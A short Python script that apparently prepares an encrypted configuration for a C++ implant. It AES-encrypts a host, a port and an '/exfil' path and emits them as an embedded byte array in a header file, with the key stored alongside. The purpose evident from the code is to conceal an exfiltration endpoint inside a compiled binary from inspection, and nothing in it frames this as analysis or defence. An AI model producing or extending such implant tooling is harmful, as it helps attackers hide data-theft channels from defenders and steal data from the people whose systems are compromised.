from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import base64

# === STEP 1: Generate a proper AES-256 key (32 bytes) ===
key = get_random_bytes(32)
base64_key = base64.b64encode(key).decode()

# === CONFIGURATION ===
host = "127.0.0.1"
port = "443"
path = "/exfil"

# === ENCRYPT FUNCTION ===
def encrypt(plaintext: str, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(plaintext.encode(), AES.block_size)
    return cipher.encrypt(padded)

# === ENCRYPT FIELDS WITH SEPARATE IVs ===
iv_host = get_random_bytes(16)
iv_port = get_random_bytes(16)
iv_path = get_random_bytes(16)

enc_host = encrypt(host, iv_host)
enc_port = encrypt(port, iv_port)
enc_path = encrypt(path, iv_path)

# === STRUCTURE FOR C++ OUTPUT ===
# [32 bytes key]
# [16B IV_host] [1B len_host] [enc_host]
# [16B IV_port] [1B len_port] [enc_port]
# [16B IV_path] [1B len_path] [enc_path]

binary_blob = (
    key +
    iv_host + bytes([len(enc_host)]) + enc_host +
    iv_port + bytes([len(enc_port)]) + enc_port +
    iv_path + bytes([len(enc_path)]) + enc_path
)

# === WRITE TO C++ FRIENDLY FILE ===
cpp_array = ", ".join(f"0x{b:02X}" for b in binary_blob)
cpp_output = f"// AES-256 key (base64): {base64_key}\n// HOST IV: {iv_host}\n// PORT IV: {iv_port}\n// PATH IV {iv_path}\nunsigned char embedded_config[] = {{ {cpp_array} }};\n"

with open("config_blob.h", "w") as f:
    f.write(cpp_output)

base64_key  # Show the base64 version of the AES key
print(f"Total config size (bytes): {len(binary_blob)}")
